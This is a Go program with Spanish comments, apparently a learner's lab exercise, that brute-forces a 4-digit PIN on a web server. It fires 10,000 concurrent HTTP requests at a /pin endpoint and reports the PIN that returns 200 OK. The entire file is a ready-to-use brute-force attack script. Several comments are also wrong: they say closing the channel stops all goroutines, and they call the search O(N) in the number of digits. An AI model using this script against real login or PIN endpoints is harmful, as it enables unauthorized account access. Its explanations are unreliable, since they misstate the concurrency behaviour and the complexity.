package main

// imports
import (
	"fmt"
	"net/http"
	"sync"
)

// variables globales
var ip = "0.0.0.0"
var port = 1234 // put your instance's port here

// Es mi primera vez programando en GO: El objetivo es utilizar multi-hilos para probar todos los pines posibles en un servidor web. En Go esto se puede hacer con goroutines y un WaitGroup. El código es bastante simple, pero efectivo. Se crea un canal llamado done que se cierra cuando se encuentra el PIN correcto. Luego, se ejecutan 10,000 goroutines, cada una probando un PIN diferente. Si se encuentra el PIN correcto, se cierra el canal done y se detienen todas las goroutines. Si no se encuentra el PIN correcto, el programa termina después de probar todos los pines.
// explicación de parametros:
// pin: el pin a probar, numero entero.
// wg: un puntero a un WaitGroup, que se utiliza para esperar a que todas las goroutines terminen.
// done: un canal que se cierra cuando se encuentra el PIN correcto.

func tryPin(pin int, wg *sync.WaitGroup, done chan bool) {
	defer wg.Done() // Marca la goroutine como terminada
	formattedPin := fmt.Sprintf("%04d", pin) // asigna el pin en formato de 4 digitos
	url := fmt.Sprintf("http://%s:%d/pin?pin=%s", ip, port, formattedPin) // asigna la url con el pin formateado
	fmt.Printf("Probando PIN: %s\n", formattedPin) // Agrega una impresión para mostrar el PIN que se está probando
	resp, err := http.Get(url) // realiza una solicitud HTTP GET a la URL
	if err != nil { // condicional si hay un error en la soliticud detener la goroutine
		return
	}
	defer resp.Body.Close() // cierra el cuerpo de la respuesta, sin esta linea, causaría memory leaking.

	// condicional si la respuesta es 200 OK, imprime el pin correcto y cierra el canal done
	if resp.StatusCode == http.StatusOK {
		fmt.Printf("¡PIN correcto encontrado!: %s\n", formattedPin)
		close(done) // Detén todas las goroutines
	}
}

func main() {
	// declaro el wg y el canal done
	var wg sync.WaitGroup
	done := make(chan bool)
	// make en go se utiliza para crear un canal, slice o mapa.
	// (estructuras de datos)
	// armo ciclo para probar los pines
	for i := 0; i < 10000; i++ {
		// estructura select en go, se utiliza para esperar a que una de varias operaciones de E/S se complete.
		select {
		// case <-done: se ejecuta si el canal done se cierra
		case <-done:
			return
		default:
			// caso contrario, se agrega una goroutine al WaitGroup
			wg.Add(1)
			// se llama a la funcion tryPin con el pin actual
			go tryPin(i, &wg, done)
		}
	}
	// Espera a que todas las goroutines terminen
	wg.Wait()
}

// posibles combinaciones de pines: 10,000:
// una complejidad asintotica en vez de conseiderar 10mil pines posibles consideramos N digitos posibles, siendo N un numero entero, trabajando con goroutines y canales en Go, la complejidad asintotica seria O(N), ya que el tiempo de ejecución del programa dependerá del número de pines posibles y no del número de goroutines creadas. Esto hace que el programa sea escalable y eficiente, ya que puede manejar un gran número de pines posibles sin sacrificar el rendimiento.